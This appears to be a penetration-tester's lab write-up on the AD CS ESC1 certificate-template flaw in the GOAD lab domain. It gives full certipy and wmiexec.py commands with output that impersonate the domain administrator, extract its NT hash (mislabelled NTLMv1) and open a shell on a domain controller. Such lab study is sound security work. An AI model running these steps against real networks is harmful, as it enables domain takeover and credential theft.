it is possible to specify an alternate user in a certificate request. If a certificate template permits the inclusion of a `subjectAltName` (`SAN`) that differs from the user submitting the certificate signing request (CSR), this functionality can be exploited. Specifically, an attacker can request a certificate on behalf of any user in the domain by including their `subjectAltName` in the request.

The following prerequisites must apply:
- Enrollment Rights: `DOMAIN\Domain Users`.
- Requires Manager Approval: `False`.
- Authorized Signature Required: `0`.
- Client Authentication: `True` or Extended Key Usage `Client Authentication`.
- Enrollee Supplies Subject: `True`

Take note of the Template Name and Certificate Authority:

![[Pasted image 20241005173153.png]]

Use the `-upn` to specify the alternative subject. In this case the Administrator:

```bash
garffff@garfffff:~/GOAD/adcs/esc1$ certipy req -u khal.drogo@essos.local -p 'horse' -template ESC1 -ca ESSOS-CA -upn administrator@essos.local -dc-ip 192.168.56.23
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Certificate Authentication

We can retrieve the NTLMv1 hash for the targeted user:

```bash
garffff@garffff:~/GOAD/adcs/esc1$ certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

We can also authenticate to a domain controller using the TGT saved. This requires the DC/domain to be resolved using DNS:

```bash
garffff@garffff:~/GOAD/adcs/esc1$ ls administrator.*
administrator.ccache  administrator.pfx
garffff@garffff:~/GOAD/adcs/esc1$ export KRB5CCNAME=administrator.ccache
garffff@garffff:~/GOAD/adcs/esc1$ wmiexec.py -k -no-pass meereen.essos.local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```


